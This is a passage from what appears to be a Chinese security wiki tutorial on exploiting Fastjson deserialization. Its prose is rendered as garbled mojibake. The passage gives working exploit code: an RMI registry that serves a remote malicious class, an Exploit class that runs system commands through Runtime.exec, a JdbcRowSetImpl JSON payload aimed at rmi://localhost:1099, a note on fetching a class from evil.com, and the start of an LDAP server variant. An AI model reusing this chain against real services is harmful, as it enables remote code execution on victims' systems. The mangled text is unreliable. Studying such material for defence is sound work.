é€»è¾‘ï¼Œæ˜¯åˆ¤æ–­å½“å‰ç±»åæ˜¯å¦ä»¥ <code>[</code>â€‹ å¼€å¤´æˆ–ä»¥ <code>L</code>â€‹ å¼€å¤´ä»¥ <code>;</code>â€‹ ç»“å°¾ã€‚å½“ç„¶æœ¬æ¬¡è°ƒè¯•åˆ†ææ˜¯ä¸ä¼šè¿›å…¥åˆ°è¿™ä¸¤ä¸ªé€»è¾‘ï¼Œä½†æ˜¯åé¢çš„è¡¥ä¸ç»•è¿‡ä¸­åˆ©ç”¨åˆ°äº†è¿™ä¸¤ä¸ªæ¡ä»¶åˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯è¯´<strong>è¿™ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶æ˜¯åé¢è¡¥ä¸ç»•è¿‡çš„æ¼æ´ç‚¹ã€‚</strong></p><hr><p>é€šè¿‡ <code>ClassLoader.loadClass()</code>â€‹ åŠ è½½åˆ°ç›®æ ‡ç±»åï¼Œç„¶åå°†è¯¥ç±»åå’Œç±»ç¼“å­˜åˆ° Map ä¸­ï¼Œæœ€åè¿”å›è¯¥åŠ è½½çš„ç±»ã€‚</p><p>è¿”å›åï¼Œç¨‹åºç»§ç»­å›åˆ° <code>DefaultJSONParser.parseObject()</code>â€‹ ä¸­å¾€ä¸‹æ‰§è¡Œï¼Œåœ¨æœ€åè°ƒç”¨ <code>JavaBeanDeserializer.deserialze()</code>â€‹ å¯¹ç›®æ ‡ç±»è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240417174306-u1hmv7b.e2f4a776.png" alt="image" loading="lazy">â€‹</p><hr><h3 id="æ€»ç»“-1-1" tabindex="-1"><a class="header-anchor" href="#æ€»ç»“-1-1"><span>æ€»ç»“ 1_1</span></a></h3><p>æ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ <code>_bytecodes</code>â€‹ æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»éœ€è¦ç»§æ‰¿ <code>AbstractTranslet</code>â€‹ï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ <code>newInstance()</code>â€‹ å®ä¾‹åŒ–ã€‚</p><p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äº <code>getter</code>â€‹ æ–¹æ³• <code>getOutputProperties()</code>â€‹ æ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« <code>fastjson</code>â€‹ è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº† TemplatesImpl åˆ©ç”¨é“¾æµç¨‹ã€‚</p><p>é™åˆ¶æ¡ä»¶ä¹Ÿå¾ˆæ˜æ˜¾ï¼šéœ€è¦ä»£ç ä¸­åŠ äº† <code>Feature.SupportNonPublicField</code>â€‹ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">TemplatesImpl</span>#<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
<span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
    <span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
        <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
            <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="jdbcrowsetimpl-exploit" tabindex="-1"><a class="header-anchor" href="#jdbcrowsetimpl-exploit"><span>JdbcRowSetImpl Exploit</span></a></h3><p>åŸºäº JdbcRowSetImpl çš„åˆ©ç”¨é“¾ä¸»è¦æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œå³ JNDI+RMI å’Œ JNDI+LDAPï¼Œéƒ½æ˜¯å±äºåŸºäº Bean Property ç±»å‹çš„ JNDI çš„åˆ©ç”¨æ–¹å¼ã€‚</p><ul><li>JNDI + RMI(CVE-2017-3241)/åˆ©ç”¨ RMI æ„é€  EXP å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ</li><li>JNDI + LDAP</li><li>åŸºäº RMI åˆ©ç”¨çš„ JDK ç‰ˆæœ¬ <code>â‰¤ 6u141ã€7u131ã€8u121</code>â€‹â€‹</li><li>åŸºäº LDAP åˆ©ç”¨çš„ JDK ç‰ˆæœ¬ <code>â‰¤ 6u211ã€7u201ã€8u191</code>â€‹â€‹</li><li>ä¸éœ€è¦è®¾ç½® <code>Feature.SupportNonPublicField</code>â€‹â€‹</li></ul><h4 id="jndi-rmi-åˆ©ç”¨å¤ç°" tabindex="-1"><a class="header-anchor" href="#jndi-rmi-åˆ©ç”¨å¤ç°"><span>JNDI + RMI åˆ©ç”¨å¤ç°</span></a></h4><ul><li><p><strong>@typeï¼š</strong> ç›®æ ‡ååºåˆ—åŒ–ç±»åï¼›</p></li><li><p><strong>dataSourceNameï¼š</strong> RMI æ³¨å†Œä¸­å¿ƒç»‘å®šæ¶æ„æœåŠ¡ï¼ˆæ¶æ„ç±»åï¼‰ï¼›</p></li><li><p><strong>autoCommitï¼š</strong> è°ƒç”¨ setAutoCommit æ–¹æ³•ï¼Œåˆ©ç”¨ lookup æ–¹æ³•åŠ è½½è¿œç¨‹å¯¹è±¡ã€‚</p><p><strong>ã€ RMIServerã€‘</strong></p></li></ul><p>RMI æœåŠ¡ï¼Œæ³¨å†Œè¡¨ç»‘å®šäº† Exploit æœåŠ¡ï¼Œè¯¥æœåŠ¡æ˜¯æŒ‡å‘æ¶æ„ Exploit.class æ–‡ä»¶æ‰€åœ¨æœåŠ¡å™¨çš„ Referenceã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">JNDI</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>
    <span class="token doc-comment comment">/**
     * RMIServer å¯åŠ¨
     * <span class="token keyword">@param</span> <span class="token parameter">args</span>
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">AlreadyBoundException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Java RMI registry created. port on 1099&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// http://127.0.0.1:8000/ æ˜¯å­˜æ”¾æ¶æ„ç±»çš„æœåŠ¡åœ°å€</span>
        <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://127.0.0.1:8000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€Exploit Classã€‘</strong></p><p>æ¶æ„ç±»ï¼Œå•ç‹¬ç¼–è¯‘æˆ class æ–‡ä»¶å¹¶æ”¾ç½®äº RMI æœåŠ¡æŒ‡å‘çš„ä¸‰æ–¹ Web æœåŠ¡ä¸­ï¼Œä½œä¸ºä¸€ä¸ª Factory ç»‘å®šåœ¨æ³¨å†Œè¡¨æœåŠ¡ä¸­ã€‚</p><p>æ³¨æ„å¦‚æœæ¶æ„ç±»æ˜¯åœ¨åŒ…ä¸­çš„è¯ï¼ŒRMIServer ä¸­éœ€è¦åŠ ä¸ŠåŒ…åä½œä¸º factoryï¼Œä¸ç„¶å¯ä»¥çœ‹åˆ°æœ‰è¯·æ±‚ï¼Œä½†æ˜¯ç”±äºç±»ä¸å¯¹ä¼šåŠ è½½å¤±è´¥ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// http://127.0.0.1:8000/ æ˜¯å­˜æ”¾æ¶æ„ç±»çš„æœåŠ¡åœ°å€</span>
<span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;EXP.Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;EXP.Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://127.0.0.1:8000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// æˆ–è€…</span>
<span class="token comment">// http://127.0.0.1:8000/ æ˜¯å­˜æ”¾æ¶æ„ç±»çš„æœåŠ¡åœ°å€</span>
<span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;éšä¾¿ä»€ä¹ˆåå­—&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;EXP.Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://127.0.0.1:8000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418122605-nbniqxg.d42094a1.png" alt="image" loading="lazy">â€‹</p><p>å¯ä»¥ä½¿ç”¨ Python èµ·ä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">EXP</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">&quot;os.name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">&quot;win&quot;</span><span class="token punctuation">)</span>
                    <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;cmd.exe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">}</span>
                    <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;touch /tmp/hacked&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Exploit</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€JdbcRowSetImplPocã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true}&quot;</span><span class="token punctuation">;</span>
        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// è¿™é‡Œçš„ rmi è¯·æ±‚ä¸»è¦æ˜¯çœ‹ bind name</span>
<span class="token comment">// registry.bind(&quot;Exploit&quot;, referenceWrapper);</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418113224-xs89v4j.afa53014.png" alt="image" loading="lazy">â€‹</p><p>ã€<strong>æ•´ä½“ç»“æ„ã€‘</strong></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418122437-fo0p64x.c0ed2357.png" alt="image" loading="lazy">â€‹</p><h4 id="æ³¨æ„äº‹é¡¹" tabindex="-1"><a class="header-anchor" href="#æ³¨æ„äº‹é¡¹"><span>æ³¨æ„äº‹é¡¹</span></a></h4><p>è¿™é‡Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºæˆ‘è¿™æ˜¯åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸‹çš„ï¼Œå“ªæ€•çš„æˆ‘çš„ Web æœåŠ¡æ²¡èµ·æ¥ï¼Œä¹Ÿèƒ½æ­£å¸¸çš„å¼¹å‡ºè®¡ç®—å™¨ï¼Œæ ¹æœ¬æ²¡å»è¯·æ±‚ Web ç›®å½•ä¸‹çš„æ¶æ„ç±»æ–‡ä»¶ï¼Œä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ç¼“å­˜çš„é—®é¢˜ï¼Œå› ä¸ºä¸€å¼€å§‹æ˜¯æ­£å¸¸çš„ï¼Œåé¢å°±ä¸æ­£å¸¸äº†ã€‚ã€‚ã€‚</p><p><strong>åŸå› ï¼š</strong> å®¢æˆ·ç«¯è·å–åˆ° ReferenceWrapper å¯¹è±¡å¼€å§‹ä»æœ¬åœ° CLASSPATH ä¸­æœç´¢ EvilObject ç±»ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šä» http://evil.com/ ä¸Šè·å– http://evil.com/EvilObject.class å­—èŠ‚ç ã€‚</p><p>å°† IDEA ç¼–è¯‘å‡ºæ¥çš„ target ç›®å½•ä¸‹çš„ Exploit.class å¤åˆ¶åˆ° <code>D:\Testby</code>â€‹ ç›®å½•ï¼Œå¹¶åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„ <code>.class</code>â€‹ æ–‡ä»¶ã€‚ç„¶åä»æ–°è¿è¡Œ <code>JdbcRowSetImplPoc</code>â€‹ è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°ä»–ä¼šæŒ‰ç…§ç±»çš„ <strong>&quot;å…¨é™å®šç±»å&quot;ï¼ˆFully Qualified Class Nameï¼‰</strong> è¿›è¡Œè¯·æ±‚ï¼Œæ‰€ä»¥æ–°å»ºä¸€ä¸ª EXP ç›®å½•å¹¶æŠŠ <code>Exploit.class</code>â€‹ æ”¾å…¥å…¶ä¸­ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418140646-t1l9vqa.04777add.png" alt="image" loading="lazy">â€‹</p><p>â€</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418140216-8pmxsa3.4a980103.png" alt="image" loading="lazy">â€‹</p><p>å°±ç®—ä¿®æ”¹ä½ çš„ RMIServer è¯·æ±‚åˆ°äº†æ–‡ä»¶ï¼Œå› ä¸ºä½ çš„ Exploit.class å®é™…ä¸Šæ˜¯ EXP.Exploit ç±»ï¼ˆå…¨é™å®šç±»åï¼‰ï¼Œæ‰€ä»¥ååºåˆ—åŒ–çš„æ—¶å€™è¿˜æ˜¯ä¼šå¤±è´¥ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418142119-npyddq3.254e160d.png" alt="image" loading="lazy">â€‹</p><h4 id="jndi-ldap-åˆ©ç”¨å¤ç°" tabindex="-1"><a class="header-anchor" href="#jndi-ldap-åˆ©ç”¨å¤ç°"><span>JNDI + LDAP åˆ©ç”¨å¤ç°</span></a></h4><p>ldap çš„ä¼˜åŠ¿åœ¨äºæ”¯æŒæ›´é«˜çš„ java ç‰ˆæœ¬ï¼Œpoc çš„åŒºåˆ«åªæ˜¯è¯·æ±‚åè®®ä¸º <code>ldap://</code>â€‹ã€‚</p><p><strong>ã€LDAPServerã€‘</strong></p><p>éœ€è¦æ·»åŠ  <a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk" target="_blank" rel="noopener noreferrer">unboundid-ldapsdk<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> ä¾èµ–</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">JNDI</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryDirectoryServer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryDirectoryServerConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryListenerConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryInterceptedSearchResult</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryOperationInterceptor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">Entry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">LDAPException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">LDAPResult</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">ResultCode</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocketFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">SocketFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ssl<span class="token punctuation">.</span></span><span class="token class-name">SSLSocketFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">InetAddress</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">LDAP_BASE</span> <span class="token operator">=</span> <span class="token string">&quot;dc=example,dc=com&quot;</span><span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> main <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8000/#Exploit&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">1389</span><span class="token punctuation">;</span>


        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">InMemoryDirectoryServerConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span><span class="token constant">LDAP_BASE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
